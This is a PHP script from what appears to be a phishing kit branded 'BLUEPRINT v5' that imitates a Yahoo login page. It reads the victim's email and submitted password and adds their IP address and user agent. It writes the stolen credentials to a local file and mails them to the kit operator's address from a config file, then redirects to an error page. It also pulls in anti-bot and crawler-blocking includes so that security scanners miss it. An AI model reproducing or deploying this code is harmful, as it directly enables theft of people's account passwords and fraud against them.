<?php
error_reporting(0);
include '../../blueprint/antbots/ip_blocklist.php';
include '../../blueprint/antbots/crawler.php';
include '../../blueprint/antbots/boting.php';
include '../../blueprint/antbots/myz.php';
include '../../huehuehue.php';
session_start();


$v_ip = $_SERVER['REMOTE_ADDR'];
$hash = md5($v_ip);

if(!empty($_SESSION['email']))  {

$useremail = $_SESSION['email'];
 
}

if(!empty($_POST['password']))  {

$pass = $_POST['password'];
$_SESSION['password'] = $_POST['password'];
date_default_timezone_set('Europe/Amsterdam');
$ip = $_SERVER['REMOTE_ADDR'];

$useremail = $_SESSION['email'];

$time = date("m-d-Y g:i:a");
$agent = $_SERVER['HTTP_USER_AGENT'];

include "../../files/conf/config.php";


$msg .= "+ ------------------------------------------+\n";
$msg .= "| ヘ(◔_◔)ノ  💵BLUEPRINT | yahoo Login Details \n";
$msg .= "+ ------------------------------------------+\n";
$msg .= "| 📧 EMAIL  :  ".$useremail."\n";
$msg .= "| 🔑 PASS   :  ".$pass."\n"; 
$footer = "+ ------------------------------------------+\n";
$footer .= "+ IP => $ip \n  USERAGENT => $agent\n";
$footer .= "+ ------------------------------------------+\n\n";

$data = $msg . $footer;
if($savetxt == "on"){
$save=fopen("../../files/data/email".$salt.".txt",'a');
	          fwrite($save,$data );
	          fclose($save);
}
$subject = "Blue_prints v5 | Y4h00"."IP: ".$_SERVER['REMOTE_ADDR'];
$headers = "From: blue_printss@M&T.com";
$headers .= "Content-Type: text/plain; charset=utf-8\r\n";
@mail($emailz, $subject, $data, $headers);
header("location: error.php"); 
}

?>